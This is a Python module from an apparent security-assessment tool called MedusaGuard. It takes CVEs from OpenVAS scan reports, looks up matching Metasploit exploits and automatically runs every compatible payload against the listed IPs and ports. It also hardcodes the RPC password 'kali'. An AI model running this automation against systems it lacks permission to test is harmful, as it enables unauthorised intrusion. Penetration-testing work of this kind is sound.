import csv
import subprocess
import time
import os
from datetime import datetime
from pymetasploit3.msfrpc import MsfRpcClient
from termcolor import colored
from logger import logger

"""
MedusaGuard Exploitation Module

This module is responsible for processing OpenVAS CSV reports, identifying exploitable CVEs,
connecting to the Metasploit RPC server, executing corresponding exploits, and generating detailed
exploitation reports. The module leverages the Metasploit Framework to automate the exploitation
process based on the vulnerabilities identified in the OpenVAS scans.

Usage:
------
To execute the exploitation workflow, call the `run_exploit_module` function with the path to
the OpenVAS CSV report.

Example:
    run_exploit_module("path/to/openvas_report.csv")
"""

# Global Variables
connectest = (
    False  # Indicates if the connection to Metasploit RPC server is established
)
connectfail = "Connection to the Metasploit RPC server has failed. Attempting again in 10 seconds."
exploitedcves = 0
incompatiblecves = 0
noexploitcve = 0  # Counter for CVEs without corresponding Metasploit exploits
nxcvelist = ["0"]
rowcounter = 0
report = None  # Will hold the report file object


def cveexploitation(noexploitcve, nxcvelist, targetcve, targetip, targetport, client):
    """
    Searches for Metasploit exploits corresponding to the provided CVEs and attempts to execute them.

    Args:
        expdbres (completedreport): Return result for the SearchSploit command to identify further publicly available exploits.
        noexploitcve (int): Current count of CVEs without exploits.
        nxcvelist (list): List of CVEs without available exploits.
        targetcve (list): List of CVEs to exploit.
        targetip (str): Target IP address.
        targetport (int): Target port number.
        client (MsfRpcClient): Connected Metasploit RPC client.

    Returns:
        tuple: Updated (noexploitcve, nxcvelist) after processing the CVEs.
    """
    global exploitedcves

    for cve in targetcve:
        # Uncomment for verbose output
        #print(
        #    colored("[INFO] ", "cyan")
        #    + f"Searching Metasploit exploits for CVE: {cve}"
        #)
        logger.info(f"Searching for Metasploit exploits for CVE: {cve}")
        cvematch = client.modules.search(f"type:exploit cve:{cve}")
        payloadfail = 0  # Number of payloads that failed
        payloadpass = 0  # Number of payloads that succeeded

        if cvematch:
            exploitname = cvematch[0].get("fullname")
            print(
                colored("[ALERT] ", "red")
                + f"Found exploit: {exploitname} for CVE: {cve}"
            )
            logger.info(f"Found exploit: {exploitname} for CVE: {cve}")
            exploit = client.modules.use("exploit", exploitname)
            exploit["RHOSTS"] = targetip
            exploit["RPORT"] = targetport
            compatpayloads = exploit.targetpayloads()
            exploitedcves += 1

            report.write(
                "---------------------------------------- \n"
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Exploitable CVE Found: {cve}\n"
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Identified Exploit: {exploitname}\n"
                f"Target IP: {targetip}\n"
                f"Target Port: {targetport}\n \n"
            )

            for payload in compatpayloads:
                logger.info(f"Attempting payload: {payload}")
                try:
                    exploit.execute(payload=payload)
                except ValueError:
                    logger.info(
                        f"Payload {payload} is incompatible with exploit {exploitname}"
                    )
                    payloadfail += 1
                else:
                    logger.info(f"Payload {payload} executed successfully")
                    payloadpass += 1

            payloadtotal = payloadpass + payloadfail
            expdbres = subprocess.run(["searchsploit", "--cve", cve], shell = False, check = True)
            report.write(
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Exploitation completed. \n"
                f"Payload Statistics: \n"
                f"Total: {payloadtotal}\n"
                f"Successful: {payloadpass}\n"
                f"Failed: {payloadfail}\n \n"
                f"Detections in ExploitDB: \n {expdbres} \n"
                f"---------------------------------------- \n \n"
            )
            print(
                colored("[INFO] ", "cyan")
                + f"Exploitation of CVE {cve} completed. Successful: {payloadpass}, Failed: {payloadfail}"
            )
            logger.info(
                f"Exploitation of CVE {cve} completed. Successful: {payloadpass}, Failed: {payloadfail}"
            )
        else:
            print(
                colored("[INFO] ", "cyan")
                + f"No Metasploit exploit found for CVE: {cve}"
            )
            logger.info(f"No Metasploit exploit found for CVE: {cve}")
            noexploitcve += 1
            nxcvelist.append(cve)

    return noexploitcve, nxcvelist


def openvasread(rowcounter, csv_path, client):
    """
    Reads the OpenVAS CSV report and processes each row to identify and exploit CVEs.

    Args:
        rowcounter (int): Current count of processed rows.
        csv_path (str): Path to the OpenVAS CSV report.
        client (MsfRpcClient): Connected Metasploit RPC client.

    Returns:
        tuple: Updated (rowcounter, noexploitcve, nxcvelist) after processing the CSV.
    """
    global noexploitcve, nxcvelist

    print(
        colored("[INFO] ", "cyan")
        + "Reading OpenVAS CSV report from: "
        + colored(f"{csv_path}", attrs=["bold"])
    )
    logger.info(f"Reading OpenVAS csv report from: {csv_path}")
    try:
        with open(csv_path, "r") as csvfile:
            openvasresults = csv.DictReader(csvfile)
            report.write(
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] OpenVAS report opened and read successfully \n"
            )
            print(
                colored("[INFO] ", "cyan")
                + "OpenVAS report opened and read successfully."
            )
            logger.info("OpenVAS csv report read successfully")

            for row in openvasresults:
                rowcounter += 1
                if row["CVEs"]:
                    targetip = row["IP"]
                    targetport = row["Port"]
                    targetcve = row["CVEs"].split(",")
                    logger.info(
                        f"Processing row {rowcounter}: IP={targetip}, Port={targetport}, CVEs={targetcve}"
                    )
                    noexploitcve, nxcvelist = cveexploitation(
                        noexploitcve, nxcvelist, targetcve, targetip, targetport, client
                    )
                else:
                    logger.info(f"No CVEs found on row {rowcounter}. Skipping.")
    except FileNotFoundError:
        print(colored("[ERROR] ", "red") + f"CSV file not found: {csv_path}")
        logger.error(f"CSV file not found: {csv_path}")
    except Exception as e:
        print(colored("[ERROR] ", "red") + f"Error reading CSV file: {e}")
        logger.error(f"Error reading CSV file: {e}")

    return rowcounter, noexploitcve, nxcvelist


def reportcreation():
    """
    Creates and initialises the exploitation report file in the 'metasploit_results' directory.

    The report file includes headers indicating the start of the exploitation suite.
    """
    global report, reportname

    report_dir = "metasploit_results"

    # Get the absolute path of the current script
    script_dir = os.path.dirname(os.path.abspath(__file__))
    report_dir_absolute = os.path.join(script_dir, report_dir)

    # Create the report filename with the desired directory
    reportname = os.path.join(
        report_dir_absolute,
        f'MedusaGuard Exploit Report {datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.txt',
    )

    try:
        report = open(reportname, "w")
        print(
            colored("[INFO] ", "cyan")
            + f"Created report file: "
            + colored(f"{reportname}", attrs=["bold"])
        )
        report.write(
            "Commencing MedusaGuard Exploitation component. \n"
            f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Start time of exploitation suite \n \n \n \n"
        )
    except Exception as e:
        print(colored("[ERROR] ", "red") + f"Failed to create report file: {e}")


def reportfinalise(incompatiblecves, exploitedcves, nxcvelist):
    """
    Finalises the exploitation report by summarising the results and listing CVEs without exploits.

    Args:
        incompatiblecves (int): Number of CVEs without compatible payloads.
        exploitedcves (int): Number of successfully exploited CVEs.
        nxcvelist (list): List of CVEs without available exploits.
        nxexpdbres (completedreport): Return result for the SearchSploit command to identify further publicly available exploits.
    """
    global report

    print(colored("[INFO] ", "cyan") + "Finalizing report...")
    report.write(
        "The following CVEs were detected, but Metasploit does not have an exploit to target these. \n"
        "Search results from ExploitDB have been secured for each CVE. \n"
    )
    if len(nxcvelist) > 1:
        del nxcvelist[0]
    for nxcve in nxcvelist:
        incompatiblecves += 1
        nxexpdbres = subprocess.run(["searchsploit", "--cve", nxcve], shell = False, check = True)
        report.write(nxcve + "\n" + nxexpdbres + "\n \n")
    totalcves = incompatiblecves + exploitedcves
    report.write(
        "\n \n \n \n"
        "End of Report Summary \n"
        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] End time of exploitation suite \n"
        f"Total CVEs examined: {totalcves}\n"
        f"Total exploited CVEs: {exploitedcves}\n"
        f"Incompatible CVEs: {incompatiblecves}\n"
    )
    report.close()
    print(
        colored("[INFO] ", "cyan")
        + f"Metasploit report finalized and saved as "
        + colored(f"{reportname}", attrs=["bold"])
    )
    logger.info(f"Metasploit report created and saved to {reportname}")


def rpcconnect(connectest, connectfail):
    """
    Attempts to establish a connection to the Metasploit RPC server. Retries every 10 seconds upon failure.

    Args:
        connectest (bool): Current connection status.
        connectfail (str): Message to display upon connection failure.
    """
    global client

    while not connectest:
        try:
            print(
                colored("[INFO] ", "cyan")
                + "Attempting to connect to Metasploit RPC server..."
            )
            client = MsfRpcClient("kali", port=55553, ssl=True)
        except Exception as e:
            print(colored("[ERROR] ", "red") + f"{connectfail}: {e}")
            if report:
                report.write(
                    f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Connection failed: {e}\n"
                )
                logger.error("Connection to Metasploit RPC server failed")
            time.sleep(10)
        else:
            print(
                colored("[INFO] ", "cyan")
                + "Successfully connected to Metasploit RPC server."
            )
            logger.info("Successfully connected to Metasploit RPC server")
            if report:
                report.write(
                    f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Successfully connected to Metasploit RPC server \n \n \n \n"
                )
            connectest = True


def run_exploit_module(csv_path):
    """
    Executes the exploitation module workflow, which includes creating a report, starting the Metasploit RPC daemon,
    connecting to the RPC server, processing the OpenVAS CSV report, and finalizing the exploitation report.

    Args:
        csv_path (str): Path to the OpenVAS CSV report.
    """
    global connectest, connectfail, exploitedcves, incompatiblecves, noexploitcve, nxcvelist, rowcounter

    # Initialize counters
    connectest = False
    connectfail = "Connection to the Metasploit RPC server has failed. Attempting again in 10 seconds."
    exploitedcves = 0
    incompatiblecves = 0
    noexploitcve = 0
    nxcvelist = ["0"]
    rowcounter = 0

    # Create and initialize report
    reportcreation()

    # Start Metasploit RPC daemon
    try:
        print(colored("\n>>> Metasploit Exploitation", attrs=["bold"]))
        print(
            colored("[INFO] ", "cyan") + "Starting Metasploit RPC daemon (msfrpcd)..."
        )
        logger.info("Starting Metasploit RPC daemon")
        # Correct usage with shell=False and a list of arguments
        subprocess.run(["msfrpcd", "-P", "kali"], shell=False, check=True)
    except subprocess.CalledProcessError as e:
        print(colored("[ERROR] ", "red") + f"Failed to start msfrpcd: {e}")
        logger.error(f"Failed to start msfrpc: {e}")
        report.write(
            f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Failed to start msfrpcd: {e}\n"
        )
        return

    # Establish RPC connection
    rpcconnect(connectest, connectfail)

    # Read and process OpenVAS CSV report
    rowcounter, noexploitcve, nxcvelist = openvasread(rowcounter, csv_path, client)

    # Finalize the report
    reportfinalise(incompatiblecves, exploitedcves, nxcvelist)

    print(
        colored("[INFO] ", "cyan")
        + "Exploitation process completed. Report saved as "
        + colored(f"{reportname}", attrs=["bold"])
    )
    logger.info("Exploitation process completed")

    incompatiblecves = len(nxcvelist)
    return exploitedcves, incompatiblecves, reportname  # Return the counts
